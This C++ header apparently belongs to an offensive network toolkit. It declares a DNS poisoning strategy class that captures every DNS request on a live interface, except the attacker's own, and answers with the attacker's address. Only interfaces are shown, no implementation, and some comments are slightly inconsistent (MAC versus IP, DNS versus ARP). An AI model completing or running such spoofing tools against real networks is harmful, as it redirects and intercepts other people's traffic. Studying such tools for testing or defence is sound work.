#pragma once

#include "DnsResourceData.h"
#include "MacAddress.h"
#include "PcapLiveDevice.h"
#include "RawPacket.h"
#include "dns_poisoning/dns_poisoning_strategy.h"
#include <memory>
#include <optional>
#include <stdexcept>

namespace ATK::DNS {
/**
 * All out DNS poisoning strategy, will capture every DNS request packet except
 * the attacker's and send back the attackerMac.
 */
class AllOutDnsPoisoningStrategy : public ATK::DNS::DnsPoisoningStrategy {
  public:
    class Builder {
      public:
        explicit Builder(pcpp::PcapLiveDevice *device) : device_(device) {}
        Builder &attackerIp(pcpp::IPv4Address attackerIp) {
            this->attackerIp_ = attackerIp;
            return *this;
        }
        /**
         * If no attackerMac is supplied, default to the mac address of the
         * interface
         */
        std::unique_ptr<AllOutDnsPoisoningStrategy> build() {
            return std::unique_ptr<AllOutDnsPoisoningStrategy>(
                new AllOutDnsPoisoningStrategy(this->device_,
                                               this->attackerIp_));
        }

      private:
        pcpp::PcapLiveDevice *device_;
        pcpp::IPv4Address attackerIp_;
    };

    /**
     * Executes Arp all out poisoning attack.
     *
     * Will reply to every incoming DNS packet, except those to the attacker's
     * interface with the attackerMac.
     */
    void execute() override;

  private:
    AllOutDnsPoisoningStrategy(pcpp::PcapLiveDevice *device,
                               pcpp::IPv4Address attackerIp)
        : device_(device), attackerIp_(std::move(attackerIp)) {
        if (device == nullptr) {
            throw std::invalid_argument("Not a valid interface");
        }
    }

    void onPacketArrives(pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device,
                         void *cookie) override;

    pcpp::PcapLiveDevice *device_;
    pcpp::IPv4Address attackerIp_;
};
} // namespace ATK::DNS
